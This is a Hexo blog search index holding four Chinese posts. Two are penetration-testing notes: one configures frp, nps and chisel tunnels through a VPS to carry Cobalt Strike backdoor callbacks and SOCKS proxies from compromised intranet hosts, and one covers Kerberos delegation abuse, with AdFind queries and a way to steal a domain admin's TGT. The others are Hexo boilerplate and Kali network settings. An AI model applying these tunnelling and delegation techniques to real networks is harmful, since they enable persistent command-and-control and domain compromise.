<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/06/04/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2024/06/04/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>Frp是专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS等多种协议。可以将内网服务以安全、便捷的方式通过具有公网IP节点的中转暴露到公网。<br>项目下载：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>#内网穿透C2上线<br>1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）<br>修改配置文件frps.ini：<br>[common]<br>bind_port &#x3D; 7000 公网服务器本地开一个7000端口<br>启动服务端：<br>.&#x2F;frps -c .&#x2F;frps.ini</p><p>2.客户端-下载-解压-修改-启动<br>修改配置文件frpc.ini：<br>[common]<br>serverAddr &#x3D; “117.72.72.84”<br>serverPort &#x3D; 7000</p><p>[[proxies]]<br>name &#x3D; “test-tcp”<br>type &#x3D; “tcp”9<br>localIP &#x3D; “127.0.0.1”<br>localPort &#x3D; 5555<br>remotePort &#x3D; 6666<br>remoteIP &#x3D; 117.72.72.84<br>启动客户端：<br> .&#x2F;frpc -c .&#x2F;frpc.ini</p><p>3、CS配置监听器<br>监听器1：VPS-IP:6666<br>监听器2：CS-IP:5555<br>后门生成：监听器1</p><p>个人理解：客户端（攻击机）连接服务端建立的7000端口，将服务端的6666端口给到本地5555端口，由于服务端可以跟另一内网通信，在被控目标机器上执行反向6666端口的后门，会主动连接客户端的6666端口，由于开启frp，把服务端的6666端口给到本地5555端口，后门找服务器的6666相当于找客户端的5555</p><p>#内网穿透信息收集<br>1、建立Socks节点（入站没限制采用）<br>启动服务端：frps -c frpssock.ini<br>[common]<br>bind_port &#x3D; 7000<br>bind_addr &#x3D; 0.0.0.0</p><p>dashboard_port &#x3D; 7500<br>dashboard_user &#x3D; admin<br>dashboard_pwd &#x3D;  admin@123<br>log_frp &#x3D; &#x2F;var&#x2F;log&#x2F;frps.log<br>log_level &#x3D; info<br>log_max_days &#x3D; 3<br>authentication_timeout &#x3D; 0<br>max_pool_count &#x3D; 50<br>allow_ports &#x3D; 80-50000</p><p>启动客户端：frpc -c frpcsock.ini<br>[common]<br>server_addr &#x3D; 47.98.210.85<br>server_port &#x3D; 7000<br>tls_enable &#x3D; ture <br>pool_count &#x3D; 5   </p><p>[plugin_socks]<br>type &#x3D; tcp<br>remote_port &#x3D; 6000<br>plugin &#x3D; socks5<br>plugin_user &#x3D; admin<br>plugin_passwd &#x3D; admin@123<br>use_encryption &#x3D; true<br>use_compression &#x3D; true</p><p>个人理解：服务端（117.72.72.84）开启7000端口；客户端（被控机）连接客户端7000端口建立连接，在被控机上建立socks5节点6000端口</p><p>2、主动转发数据（出站没限制采用）<br>服务端启动：frps -c frps.ini<br>[common]<br>bind_port &#x3D; 7000</p><p>客户端启动：frpc -c frpc.ini<br>[common]<br>serverAddr &#x3D; “47.98.210.85”<br>serverPort &#x3D; 7000</p><p>[[proxies]]<br>name &#x3D; “test-tcp”<br>type &#x3D; “tcp”<br>localIP &#x3D; “192.168.2.22”<br>localPort &#x3D; 80<br>remotePort &#x3D; 8888<br>remoteIP &#x3D; “47.98.210.85”</p><p>个人理解：将192.168.2.22:80给到服务端的8888端口（117.72.72.84:8888）<br>以上端口不行请自己更换端口再试</p><p>Nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，DNS解析等），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。<br>项目下载：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>#内网穿透C2上线<br>1、启动<br>.&#x2F;nps install<br>.&#x2F;nps<br><a href="http://vps-ip:8080/">http://VPS-IP:8080/</a> admin&#x2F;123<br>2、创建客户端，生成密匙<br>.&#x2F;npc -server&#x3D;VPS-IP:8024 -vkey&#x3D;xxxxxx<br>3、添加协议隧道，绑定指向<br>远程绑定6666,指向本地5555<br>4、CS配置监听器<br>监听器1：VPS-IP:6666<br>监听器2：CS-IP:5555<br>后门生成：监听器1</p><p>#内网穿透信息收集<br>1、建立Socks&#x2F;HTTP隧道（入站没限制采用）<br>添加协议隧道，绑定端口<br>配合Proxifier规则配置测试</p><p>2、主动转发数据（出站没限制采用）<br>添加协议隧道，绑定目标及端口</p><p>Chisel 是一个快速 TCP&#x2F;UDP 隧道，通过 HTTP 传输，通过 SSH 保护。单个可执行文件包括客户端和服务器。用 Go（golang）编写。 Chisel 主要用于穿过防火墙，但也可用于为网络提供安全端点。<br>项目下载：<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p><p>#内网穿透C2上线<br>建立服务端监听1234<br>.&#x2F;chisel server -p 1234 –reverse<br>建立客户端连接服务端后将141上5555给到服务端6666上<br>.&#x2F;chisel client -v 47.98.210.85:1234 R:0.0.0.0:6666:192.168.139.141:5555</p><p>#内网穿透信息收集<br>1、建立Socks节点（入站没限制采用）<br>建立服务端监听1090<br>chisel server -p 1090 –socks5<br>建立客户端连接服务端后将使用Socks服务<br>chisel client 192.168.139.130:1090 socks &amp;</p><p>2、主动转发数据（出站没限制采用）<br>建立服务端监听1234<br>.&#x2F;chisel server -p 1234 –reverse<br>建立客户端连接服务端后将141上5555给到服务端6666上<br>.&#x2F;chisel client -v 47.98.210.85:1234 R:0.0.0.0:8888:192.168.2.22:80</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>委派安全</title>
    <link href="/2024/05/23/%E5%A7%94%E6%B4%BE%E5%AE%89%E5%85%A8/"/>
    <url>/2024/05/23/%E5%A7%94%E6%B4%BE%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<p>涉及项目:<br><a href="https://github.com/shanfenglan/test/tree/master/spooler">https://github.com/shanfenglan/test/tree/master/spooler</a><br><a href="https://github.com/fortra/impacket%EF%BC%88%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/fortra/impacket（综合利用）</a><br><a href="https://github.com/gentilkiwi/kekeo%EF%BC%88%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/gentilkiwi/kekeo（票据利用）</a><br><a href="https://github.com/topotam/PetitPotam%EF%BC%88%E7%BB%93%E5%90%88ntlm%E9%87%8D%E6%94%BE%EF%BC%89">https://github.com/topotam/PetitPotam（结合ntlm重放）</a><br><a href="https://github.com/leechristensen/SpoolSample%EF%BC%88%E6%89%93%E5%8D%B0%E6%9C%BA%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/leechristensen/SpoolSample（打印机利用）</a><br><a href="https://www.joeware.net/freetools/tools/adfind/(%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)">https://www.joeware.net/freetools/tools/adfind/(信息收集)</a><br>参考文章：<br><a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a><br><a href="https://www.cnblogs.com/sup3rman/p/16088447.html">https://www.cnblogs.com/sup3rman/p/16088447.html</a><br><a href="https://mp.weixin.qq.com/s/0UOOMF5s00D-y3fojVKMdA">https://mp.weixin.qq.com/s/0UOOMF5s00D-y3fojVKMdA</a></p><p>1、非约束委派(Unconstrained Delegation, UD)<br>2、约束委派(Constrained Delegation, CD)<br>3、基于资源的约束委派(Resource Based Constrained Delegation, RBCD)<br>简而言之，非约束委派是指用户账户将自身的TGT转发给服务账户使用。约束委派通过S4U2Self和S4U2Proxy两个扩展协议限制服务账户只能访问指定服务资源。<br>RBCD主要就是委派的管理移交给服务资源进行控制，其余和约束性委派基本相同。</p><p>账户分类：<br>机器账户：计算机本身名称的账户，在域中computers组内的计算机。<br>主机账户：计算机系统的主机账户，用于正常用户登入计算机使用。<br>服务账户：计算机服务安装时创建的账户，用于运行服务时使用，不可用于登入计算机。<br>#非约束委派<br>原理：<br>机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。</p><p>利用场景：<br>攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的TGT，从而模拟域管用户。</p><p>复现配置：<br>1、信任此计算机来委派任何服务<br>2、setspn -U -A priv&#x2F;test webadmin<br>第一步判断查询：<br>查询域内设置了非约束委派的服务账户：AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))” dn<br>查询域内设置了非约束委派的机器账户: AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))” dn<br>利用思路1：诱使域管理员访问机器<br>利用条件：<br>1、需要Administrator权限<br>2、域内主机的机器账户开启非约束委派<br>3、域控管理员远程访问（主动或被动）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo用法</title>
    <link href="/2024/05/23/hexo/"/>
    <url>/2024/05/23/hexo/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><p>hexo clean:清理已经生成的静态文件</p><p>hexo g:生成所需的静态文件</p><p>hexo s启动本地服务，默认访问网站：<a href="http://localhost:4000/">http://localhost:4000</a></p><p>hexo d:部署网站</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/05/22/kali%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81ip/"/>
    <url>/2024/05/22/kali%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81ip/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p>返回主页<br>首页<br>管理<br>Kali配置网卡静态信息<br>阅读目录</p><p> 报错信息<br>临时配置ip</p><p>ifconfig eth0 up              &#x2F;&#x2F;端口启用<br>ifconfig eth0 down            &#x2F;&#x2F;端口关闭<br>ifconfig eth0 192.168.1.10    &#x2F;&#x2F;只修改ip地址<br>ifconfig eth0 192.168.1.10&#x2F;24 或者 ifconfig eth0 1.1.1.1 netmask 255.0.0.0<br>临时修改路由</p><p>route          &#x2F;&#x2F;查看路由表<br>netstat -rn    &#x2F;&#x2F;查看路由表<br>route del default eth0        &#x2F;&#x2F;删除eth0上的默认路由<br>route add default gw 192.168.1.1    &#x2F;&#x2F;添加默认路由<br>修改配置文件修改网卡信息</p><p>复制代码<br>&#x2F;etc&#x2F;network&#x2F;interfaces</p><p>auto lo<br>iface lo inet loopback<br>allow-hotplug eth0<br>iface eth0 inet dhcp</p><p>iface eth0 inet6 auto</p><p>修改为：</p><p>auto lo<br>iface lo inet loopback<br>allow-hotplug eth0<br>auto eth0                 # 增加了该选项，因为使用networking restart时系统启动                            auto的网卡，如不加上则启动无反应<br>iface eth0 inet static    # 配置了static 为静态ip   |   自动获取 iface eth0 inet dhcp<br>address 192.168.1.4       # 设置ip地址<br>netmask 255.255.255.0     # 设置掩码<br>gateway 192.168.1.1       # 设置网关<br>dns-nameservers 223.5.5.5 # 错误的<br> iface eth0 inet6 auto # 可写可不写<br>复制代码<br> 终端命令行下重启网络：service networking restart或 &#x2F;etc&#x2F;init.d&#x2F;networking restart 。</p><p>回到顶部<br> 报错信息<br>复制代码<br>root@bogon:<del># &#x2F;etc&#x2F;init.d&#x2F;networking restart<br>[….] Restarting networking (via systemctl): networking.serviceJob for networking.service failed because the control process exited with error code.<br>See “systemctl status networking.service” and “journalctl -xe” for details.<br> failed!<br>root@bogon:</del># vim &#x2F;etc&#x2F;network&#x2F;interfaces<br>root@bogon:~# systemctl status networking.service<br>● networking.service - Raise network interfaces<br>   Loaded: loaded (&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;networking.service; enabled; vendor prese<br>   Active: failed (Result: exit-code) since Sun 2019-04-28 12:06:52 CST; 58s ago<br>     Docs: man:interfaces(5)<br>  Process: 6811 ExecStartPre&#x3D;&#x2F;bin&#x2F;sh -c if [ “$CONFIGURE_INTERFACES” !&#x3D; “no” ] &amp;<br>  Process: 6814 ExecStart&#x3D;&#x2F;sbin&#x2F;ifup -a –read-environment (code&#x3D;exited, status&#x3D;<br> Main PID: 6814 (code&#x3D;exited, status&#x3D;1&#x2F;FAILURE)</p><p>4月 28 12:06:52 bogon systemd[1]: Starting Raise network interfaces…<br>4月 28 12:06:52 bogon ifup[6814]: Not enough information: “dev” argument is requ<br>4月 28 12:06:52 bogon ifup[6814]: ifup: failed to bring up eth0<br>4月 28 12:06:52 bogon systemd[1]: networking.service: Main process exited, code&#x3D;<br>4月 28 12:06:52 bogon systemd[1]: networking.service: Failed with result ‘exit-c<br>4月 28 12:06:52 bogon systemd[1]: Failed to start Raise network interfaces.<br>lines 1-14&#x2F;14 (END)<br>复制代码</p><p>注意代码后面不能有注释，否则报错，需要把注释删除掉</p><p>复制代码</p><h1 id="This-file-describes-the-network-interfaces-available-on-your-system"><a href="#This-file-describes-the-network-interfaces-available-on-your-system" class="headerlink" title="This file describes the network interfaces available on your system"></a>This file describes the network interfaces available on your system</h1><h1 id="and-how-to-activate-them-For-more-information-see-interfaces-5"><a href="#and-how-to-activate-them-For-more-information-see-interfaces-5" class="headerlink" title="and how to activate them. For more information, see interfaces(5)."></a>and how to activate them. For more information, see interfaces(5).</h1><p>source &#x2F;etc&#x2F;network&#x2F;interfaces.d&#x2F;*</p><h1 id="The-loopback-network-interface"><a href="#The-loopback-network-interface" class="headerlink" title="The loopback network interface"></a>The loopback network interface</h1><p>auto lo<br>iface lo inet loopback<br>auto eth0<br>iface eth0 inet static<br>address 192.168.2.135<br>netmask 255.255.255.0<br>gateway 192.168.2.1</p><p>复制代码<br>修改dns配置文件</p><p>缺点： 重启后会消失</p><p>复制代码<br>&#x2F;etc&#x2F;resolv.conf<br>nameserver 202.106.0.20<br>nameserver 202.106.46.151</p><p>修改为：<br>nameserver 202.106.0.20<br>nameserver 202.106.46.151<br>nameserver 8.8.8.8</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
